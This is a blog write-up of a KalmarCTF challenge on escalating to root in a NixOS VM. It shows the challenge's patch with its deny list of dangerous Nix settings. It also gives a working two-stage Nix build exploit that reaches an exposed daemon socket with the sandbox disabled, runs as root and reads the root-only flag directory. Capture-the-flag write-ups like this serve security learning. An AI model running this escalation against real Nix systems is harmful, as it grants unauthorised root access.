+++
date = "2024-03-16"
draft = false
path = "/blog/reproducible-pwning-writeup"
tags = ["ctf", "nix"]
title = "KalmarCTF: Reproducible Pwning writeup"
+++

I was making memes in the CTF room until someone told me Nix showed up
on a CTF, and well. It doesn't take that much to tempt me.

Reproducible Pwning is a challenge written by
[niko](https://hachyderm.io/@nrab), which involves a NixOS VM you're supposed
to root. The build user is not notably privileged.

There is a flag in `/data` which is mounted from the host via some means. That
directory is only readable by root.

There is a patch to the Nix evaluator. Interesting:

```patch
diff --git a/src/libutil/config.cc b/src/libutil/config.cc
index 37f5b50c7..fd824ee03 100644
--- a/src/libutil/config.cc
+++ b/src/libutil/config.cc
@@ -1,3 +1,4 @@
+#include "logging.hh"
 #include "config.hh"
 #include "args.hh"
 #include "abstract-setting-to-json.hh"
@@ -17,6 +18,16 @@ Config::Config(StringMap initials)
 
 bool Config::set(const std::string & name, const std::string & value)
 {
+    if (name.find("build-hook") != std::string::npos
+        || name == "accept-flake-config"
+        || name == "allow-new-privileges"
+        || name == "impure-env") {
+        logWarning({
+            .msg = hintfmt("Option '%1%' is too dangerous, skipping.", name)
+        });
+        return true;
+    }
+
     bool append = false;
     auto i = _settings.find(name);
     if (i == _settings.end()) {
```

The machine is configured with the following NixOS module, which I pulled out
of the included flake. The rest of the flake is normal stuff. There are a few
things that stand out to me:

- sudo is disabled, polkit is disabled: we are probably not looking for some
  setuid exploit
- There are some *extremely* nonstandard Nix config settings being applied

```nix
({pkgs, ...}: {
  nixpkgs.hostPlatform = "x86_64-linux";
  nixpkgs.overlays = [
    (final: prev: {
      # JADE: likely vulnerable to puck's CVE, but I doubt that is the bug cuz they
      # added a patch and there is other funny business up.
      nix = final.nixVersions.nix_2_13.overrideAttrs {
        patches = [./nix.patch];
        # JADE: due to broken integration tests, almost certainly
        doInstallCheck = false;
      };
    })
  ];

  # JADE: no interesting setuid binaries
  security = {
    sudo.enable = false;
    polkit.enable = false;
  };

  systemd.services.nix-daemon.serviceConfig.EnvironmentFile = let
    # JADE: here is the wacky part of the config.
    # This exposes the Nix daemon socket inside the sandbox (this is mostly
    # never the case unless using recursive-nix). So we are going to
    # be running a nix build inside a nix build to do something.
    sandbox = pkgs.writeText "nix-daemon-config" ''
      extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
    '';
    # JADE: I don't know what this does, so we are going to be reading some C++Nix
    # source code. But it sure smells like running the build as root.
    buildug = pkgs.writeText "nix-daemon-config" ''
      build-users-group =
    '';
  in
    # JADE: Sets additional config files to only the nix daemon. This is
    # documented in the Nix manual.
    pkgs.writeText "env" ''
      NIX_USER_CONF_FILES=${sandbox}:${buildug}
    '';
})
```

Here is the rest of the module which is uninteresting:

{% codesample(desc="`boring-module.nix`") %}
```nix
{ ... }: {
  # JADE: what the heck is this? It seems like some kind of kernel-problems
  # storage thing. Later found out this is nothing.
  environment.etc."systemd/pstore.conf".text = ''
    [PStore]
    Unlink=no
  '';

  users.users.root.initialHashedPassword = "x";
  users.users.user = {
    isNormalUser = true;
    initialHashedPassword = "";
    group = "user";
  };
  users.groups.user = {};

  system.stateVersion = "22.04";

  services.openssh = {
    enable = true;
    settings.PermitRootLogin = "no";
  };

  # JADE: save some image size
  environment.noXlibs = true;
  documentation.man.enable = false;
  documentation.doc.enable = false;
  fonts.fontconfig.enable = false;

  nix.settings = {
    # JADE: this option has no interesting security impact, just whether you
    # can build during evaluation phase.
    allow-import-from-derivation = false;
    experimental-features = ["flakes" "nix-command" "repl-flake" "no-url-literals"];
  };
}
```
{% end %}

So, to sum up:
- We have a Nix daemon socket in the sandbox.
- We are running builds with some weird group.
- Several config settings that make trusted users effectively root are
  blocked by the patch. Interesting. We probably become a trusted user then.

So like, let's run some build.

```nix
let
  nixpkgs = builtins.fetchTarball {
    url = "https://github.com/nixos/nixpkgs/archive/6e2f00c83911461438301db0dba5281197fe4b3a.tar.gz";
    "sha256" = "sha256:0bsw31zhnnqadxh2i2fgj9568gqabni3m0pfib806nc2l7hzyr1h";
  };
  pkgs = import nixpkgs {};
in
pkgs.runCommand "meow" { buildInputs = [ pkgs.nixVersions.nix_2_13 ]; PKGS = pkgs.path; } ''
  id -a
''
```

This gives me:

```
this derivation will be built:
  /nix/store/958afc87nsfhwlm6b62z2xksmlaawsqg-meow.drv
building '/nix/store/958afc87nsfhwlm6b62z2xksmlaawsqg-meow.drv'...
uid=1000(nixbld) gid=100(nixbld) groups=100(nixbld)
```

Hm. Boring, I was expecting to be root already.

But, why is there a socket in there? Let's try invoking another build inside
our build, maybe? And, based on the assumption we must be trusted user (since I
can't think of any other reason interaction with the bind-mounted socket would
be different from inside the sandbox), let's try just turning off the sandbox
in the inner build and see what happens?

```nix
let
  nixpkgs = builtins.fetchTarball {
    url = "https://github.com/nixos/nixpkgs/archive/6e2f00c83911461438301db0dba5281197fe4b3a.tar.gz";
    "sha256" = "sha256:0bsw31zhnnqadxh2i2fgj9568gqabni3m0pfib806nc2l7hzyr1h";
  };
  pkgs = import nixpkgs {};
  # dont worry about the contents quite yet
  hax = pkgs.writeText "hax" (builtins.readFile ./stage2.nix);
in
pkgs.runCommand "meow" { buildInputs = [ pkgs.nixVersions.nix_2_13 ]; PKGS = pkgs.path; } ''
  id -a
  nix-build --option sandbox false --extra-experimental-features 'flakes nix-command' --store unix:///tmp/daemon ${hax}
''
```

and `stage2.nix`:

```nix
let
  pkgs = import (builtins.getEnv "PKGS") { };
in
pkgs.runCommand "meow2" { } ''
  echo MEOW2
  id -a
''
```

This outputs:

```
this derivation will be built:
  /nix/store/iynjhk5a5ymp26cbyp22l15ix4lrp2f6-meow.drv
building '/nix/store/iynjhk5a5ymp26cbyp22l15ix4lrp2f6-meow.drv'...
uid=1000(nixbld) gid=100(nixbld) groups=100(nixbld)
this derivation will be built:
  /nix/store/cyw7kaqazdpgpna0jmaw7cw5348srvv3-meow2.drv
building '/nix/store/cyw7kaqazdpgpna0jmaw7cw5348srvv3-meow2.drv'...
MEOW2
uid=0(root) gid=0(root) groups=0(root)
```

Welp, I am root. Change stage 2 to `cat /data/*` and we have a flag:

```
[user@nixos:~]$ cat >stage1.nix <<-'EOF'
> let
  nixpkgs = builtins.fetchTarball {
    url = "https://github.com/nixos/nixpkgs/archive/6e2f00c83911461438301db0dba5281197fe4b3a.tar.gz";
    "sha256" = "sha256:0bsw31zhnnqadxh2i2fgj9568gqabni3m0pfib806nc2l7hzyr1h";
  };
  pkgs = import nixpkgs {};
  hax = pkgs.writeText "hax" (builtins.readFile ./stage2.nix);
in
pkgs.runCommand "meow" { buildInputs = [ pkgs.nixVersions.nix_2_13 ]; PKGS = pkgs.path; } ''
  id -a
  nix-build --option sandbox false --extra-experimental-features 'flakes nix-command' --store unix:///tmp/daemon ${hax}
''
> EOF

[user@nixos:~]$ cat >stage2.nix <<-'EOF'
> let
  pkgs = import (builtins.getEnv "PKGS") { };
in
pkgs.runCommand "meow2" { } ''
  echo MEOW2
  id -a
  ls / || true
  ls /data || true
  cat /data/*
''
> EOF

[user@nixos:~]$ nix-build stage1.nix
warning: Nix search path entry '/nix/var/nix/profiles/per-user/root/channels' does not exist, ignoring
these 2 derivations will be built:
  /nix/store/gzniydj0mayvzs7hin3v3j1643fjzrq3-hax.drv
  /nix/store/m4gjzvkjks5n1zr54cxjzmwav0g9zzj1-meow.drv
these 11 paths will be fetched (3.92 MiB download, 23.41 MiB unpacked):
<SNIP>
building '/nix/store/gzniydj0mayvzs7hin3v3j1643fjzrq3-hax.drv'...
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.
building '/nix/store/m4gjzvkjks5n1zr54cxjzmwav0g9zzj1-meow.drv'...
uid=1000(nixbld) gid=100(nixbld) groups=100(nixbld)
this derivation will be built:
  /nix/store/nv5j8z6w8zw0s6gjrmajy0wn7f2azfc0-meow2.drv
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.
building '/nix/store/nv5j8z6w8zw0s6gjrmajy0wn7f2azfc0-meow2.drv'...
MEOW2
uid=0(root) gid=0(root) groups=0(root)
bin   dev  home  lib64  proc  run  sys  usr
data  etc  lib   nix    root  srv  tmp  var
flag
kalmar{0nlyReproduc1bleMisconfigurationsH3R3}
```

I was informed later that I found an unintended solution, and one was not
supposed to "simply set `sandbox = false`". The intended solution was to either
use the `diff-hook` setting which is run as the daemon's user (like
`post-build-hook` and `build-hook` which were conspicuously also banned), or
abuse being root to tamper with the inputs to the derivation and overwriting
something run by a privileged user.

I don't think the unintended solution was that bad, though, because once you
are trusted user, it is assumed in the Nix codebase that you can just root the
box.
